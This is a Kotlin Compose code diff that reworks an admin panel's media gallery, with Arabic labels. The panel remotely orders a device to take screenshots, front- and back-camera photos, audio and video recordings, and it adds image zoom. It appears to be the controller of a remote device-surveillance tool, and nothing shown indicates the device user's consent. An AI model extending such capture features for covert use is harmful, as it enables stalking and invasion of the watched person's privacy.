@@ -70,6 +70,8 @@ import coil.compose.AsyncImage
 import coil.request.ImageRequest
 
 import androidx.compose.ui.viewinterop.AndroidView
+import androidx.compose.foundation.gestures.transformable
+import androidx.compose.foundation.gestures.rememberTransformableState
 import androidx.media3.exoplayer.rtsp.RtspMediaSource
 import androidx.media3.common.MediaItem as Media3MediaItem
 import androidx.media3.exoplayer.ExoPlayer
@@ -5020,64 +5022,100 @@ fun LiveStreamPlayer(
 
 @Composable
 fun DeviceMediaGalleryTab(viewModel: AdminViewModel) {
-    val screenshots by viewModel.screenshots.collectAsState()
-    val cameraPhotos by viewModel.cameraPhotos.collectAsState()
-    val cameraVideos by viewModel.cameraVideos.collectAsState()
-    val audioRecords by viewModel.audioRecords.collectAsState()
+    val allMedia by viewModel.allMediaFiles.collectAsState()
 
-    var selectedCategory by remember { mutableIntStateOf(0) } // 0: الصور, 1: الصوت, 2: الفيديو
-    val categories = listOf("الصور والشاشة" to 0, "الصوت" to 1, "الفيديو" to 2)
+    val categories = listOf(
+        "لقطات الشاشة" to "take_screenshot",
+        "الكاميرا الأمامية" to "take_photo_front",
+        "الكاميرا الخلفية" to "take_photo_back",
+        "التسجيلات الصوتية" to "record_audio",
+        "تسجيلات الفيديو" to "record_video_front" // Or we combine front and back if preferred, wait let's use both? The prompt says "تسجيلات الفيديو (record_video)" so we use "record_video" or front and back.
+    )
 
-    val allImages = (screenshots + cameraPhotos).sortedByDescending { it.timestamp }
-    val allAudio = audioRecords.sortedByDescending { it.timestamp }
-    val allVideos = cameraVideos.sortedByDescending { it.timestamp }
+    var selectedTab by remember { mutableIntStateOf(0) }
+    
+    // We group tabs to commands:
+    val selectedCommandSource = categories[selectedTab].second
+    
+    val currentTabItems = allMedia.filter { item ->
+        if (selectedCommandSource == "record_video_front") {
+            item.commandSource == "record_video" || item.commandSource == "record_video_front" || item.commandSource == "record_video_back"
+        } else if (selectedCommandSource == "take_screenshot") {
+            item.commandSource == "take_screenshot" || item.commandSource == "screenshot"
+        } else {
+            item.commandSource == selectedCommandSource
+        }
+    }.sortedByDescending { it.timestamp }
 
     var expandedMedia by remember { mutableStateOf<MediaItem?>(null) }
     val context = LocalContext.current
 
     Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
-        // Tab Row
-        Row(modifier = Modifier.fillMaxWidth().background(Color.White, RoundedCornerShape(12.dp)).padding(4.dp)) {
-            categories.forEach { (label, index) ->
-                val isSelected = selectedCategory == index
-                Box(
-                    modifier = Modifier
-                        .weight(1f)
-                        .height(40.dp)
-                        .clip(RoundedCornerShape(8.dp))
-                        .background(if (isSelected) Color(0xFF9155FF) else Color.Transparent)
-                        .clickable { selectedCategory = index },
-                    contentAlignment = Alignment.Center
+        ScrollableTabRow(
+            selectedTabIndex = selectedTab,
+            containerColor = Color.White,
+            contentColor = Color(0xFF9155FF),
+            edgePadding = 8.dp,
+            modifier = Modifier.clip(RoundedCornerShape(12.dp))
+        ) {
+            categories.forEachIndexed { index, (label, _) ->
+                Tab(
+                    selected = selectedTab == index,
+                    onClick = { selectedTab = index },
+                    modifier = Modifier.padding(vertical = 12.dp, horizontal = 4.dp)
                 ) {
-                    Text(label, color = if (isSelected) Color.White else Color(0xFF6B7280), fontWeight = FontWeight.Bold)
+                    Text(
+                        text = label, 
+                        color = if (selectedTab == index) Color(0xFF9155FF) else Color(0xFF6B7280),
+                        fontWeight = if (selectedTab == index) FontWeight.Bold else FontWeight.Normal,
+                        fontSize = 13.sp
+                    )
                 }
             }
         }
         
         Spacer(modifier = Modifier.height(16.dp))
 
-        // Actions Row for WebSockets Commands relative to Current Tab
-        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
-            if (selectedCategory == 0) {
-                Button(onClick = { viewModel.requestScreenshot() }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF))) {
-                    Text("لقطة شاشة", fontSize = 11.sp, maxLines = 1)
+        // Request button for the current active category
+        Row(modifier = Modifier.fillMaxWidth()) {
+            when (categories[selectedTab].second) {
+                "take_screenshot" -> {
+                    Button(onClick = { viewModel.runCommand("take_screenshot") }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF))) {
+                        Icon(Icons.Default.Screenshot, null, modifier = Modifier.size(18.dp))
+                        Spacer(Modifier.width(8.dp))
+                        Text("التقاط شاشة", fontSize = 13.sp)
+                    }
                 }
-                Button(onClick = { viewModel.requestPhoto(true) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E5FF))) {
-                    Text("أمامية", color = Color.Black, fontSize = 11.sp, maxLines = 1)
+                "take_photo_front" -> {
+                    Button(onClick = { viewModel.requestPhoto(true) }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E5FF))) {
+                        Icon(Icons.Default.CameraFront, null, tint = Color.Black, modifier = Modifier.size(18.dp))
+                        Spacer(Modifier.width(8.dp))
+                        Text("التقاط صورة كاميرا أمامية", color = Color.Black, fontSize = 13.sp)
+                    }
                 }
-                Button(onClick = { viewModel.requestPhoto(false) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF238636))) {
-                    Text("خلفية", fontSize = 11.sp, maxLines = 1)
+                "take_photo_back" -> {
+                    Button(onClick = { viewModel.requestPhoto(false) }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF238636))) {
+                        Icon(Icons.Default.CameraRear, null, modifier = Modifier.size(18.dp))
+                        Spacer(Modifier.width(8.dp))
+                        Text("التقاط صورة كاميرا خلفية", fontSize = 13.sp)
+                    }
                 }
-            } else if (selectedCategory == 1) {
-                Button(onClick = { viewModel.requestAudioRecord() }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF9100))) {
-                    Text("تسجيل وحفظ مقطع صوتي", fontSize = 12.sp)
+                "record_audio" -> {
+                    Button(onClick = { viewModel.requestAudioRecord() }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF9100))) {
+                        Icon(Icons.Default.Mic, null, modifier = Modifier.size(18.dp))
+                        Spacer(Modifier.width(8.dp))
+                        Text("تسجيل مقطع صوتي", fontSize = 13.sp)
+                    }
                 }
-            } else {
-                Button(onClick = { viewModel.requestVideo(true) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE91E63))) {
-                    Text("فيديو أمامي", fontSize = 11.sp)
-                }
-                Button(onClick = { viewModel.requestVideo(false) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFD32F2F))) {
-                    Text("فيديو خلفي", fontSize = 11.sp)
+                "record_video_front" -> {
+                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp), modifier = Modifier.fillMaxWidth()) {
+                        Button(onClick = { viewModel.requestVideo(true) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE91E63))) {
+                            Text("فيديو أمامي", fontSize = 12.sp)
+                        }
+                        Button(onClick = { viewModel.requestVideo(false) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFD32F2F))) {
+                            Text("فيديو خلفي", fontSize = 12.sp)
+                        }
+                    }
                 }
             }
         }
@@ -5086,23 +5124,25 @@ fun DeviceMediaGalleryTab(viewModel: AdminViewModel) {
 
         // Content Display
         Box(modifier = Modifier.weight(1f)) {
-            when (selectedCategory) {
-                0 -> {
-                    if (allImages.isEmpty()) EmptyMediaNotice("لا توجد صور متوفرة")
-                    else LazyVerticalGrid(columns = GridCells.Fixed(2), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
-                        items(allImages) { item -> GalleryImageCard(item) { expandedMedia = it } }
+            if (currentTabItems.isEmpty()) {
+                EmptyMediaNotice("لا توجد وسائط متوفرة حالياً في هذا القسم")
+            } else {
+                when (categories[selectedTab].second) {
+                    "record_audio" -> {
+                        LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
+                            items(currentTabItems) { item -> AudioListCard(item) { expandedMedia = it } }
+                        }
                     }
-                }
-                1 -> {
-                    if (allAudio.isEmpty()) EmptyMediaNotice("لا توجد تسجيلات صوتية مجدولة")
-                    else LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
-                        items(allAudio) { item -> AudioListCard(item) { expandedMedia = it } }
-                    }
-                }
-                2 -> {
-                    if (allVideos.isEmpty()) EmptyMediaNotice("لا توجد مقتطفات فيديو متوفرة")
-                    else LazyVerticalGrid(columns = GridCells.Fixed(2), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
-                        items(allVideos) { item -> GalleryVideoCard(item) { expandedMedia = it } }
+                    else -> {
+                        LazyVerticalGrid(columns = GridCells.Fixed(2), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
+                            items(currentTabItems) { item -> 
+                                if (selectedCommandSource == "record_video_front") {
+                                    GalleryVideoCard(item) { expandedMedia = it }
+                                } else {
+                                    GalleryImageCard(item) { expandedMedia = it }
+                                }
+                            }
+                        }
                     }
                 }
             }
@@ -5113,23 +5153,41 @@ fun DeviceMediaGalleryTab(viewModel: AdminViewModel) {
     if (expandedMedia != null) {
         Dialog(onDismissRequest = { expandedMedia = null }, properties = DialogProperties(usePlatformDefaultWidth = false)) {
             Box(modifier = Modifier.fillMaxSize().background(Color.Black.copy(alpha = 0.9f)).padding(16.dp), contentAlignment = Alignment.Center) {
-                when (expandedMedia!!.type) {
-                    "screenshot", "camera_photo" -> {
+                // Determine layout by commandSource loosely
+                val isVideo = expandedMedia!!.commandSource.contains("video", ignoreCase = true)
+                val isAudio = expandedMedia!!.commandSource.contains("audio", ignoreCase = true)
+                
+                when {
+                    isVideo || isAudio -> {
+                        ExoPlayerVideoView(mediaItem = expandedMedia!!)
+                    }
+                    else -> { // Image/Screenshot
+                        var scale by remember { mutableFloatStateOf(1f) }
+                        var offset by remember { mutableStateOf(androidx.compose.ui.geometry.Offset.Zero) }
+                        val state = rememberTransformableState { zoomChange, offsetChange, _ ->
+                            scale = (scale * zoomChange).coerceIn(1f, 5f)
+                            offset += offsetChange
+                        }
                         if (expandedMedia!!.url.isNotEmpty()) {
                             AsyncImage(
                                 model = ImageRequest.Builder(context).data(expandedMedia!!.url).crossfade(true).build(),
                                 contentDescription = null,
-                                modifier = Modifier.fillMaxSize(),
+                                modifier = Modifier
+                                    .fillMaxSize()
+                                    .graphicsLayer(
+                                        scaleX = scale,
+                                        scaleY = scale,
+                                        translationX = offset.x,
+                                        translationY = offset.y
+                                    )
+                                    .transformable(state),
                                 contentScale = ContentScale.Fit
                             )
                         } else {
                             val bmp = expandedMedia!!.toBitmap()
-                            if (bmp != null) Image(bitmap = bmp.asImageBitmap(), contentDescription = null, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Fit)
+                            if (bmp != null) Image(bitmap = bmp.asImageBitmap(), contentDescription = null, modifier = Modifier.fillMaxSize().graphicsLayer(scaleX = scale, scaleY = scale, translationX = offset.x, translationY = offset.y).transformable(state), contentScale = ContentScale.Fit)
                             else Text("خطأ في فك تشفير الصورة", color = Color.White)
                         }
-                    }
-                    else -> {
-                        ExoPlayerVideoView(mediaItem = expandedMedia!!)
                     }
                 }
                 
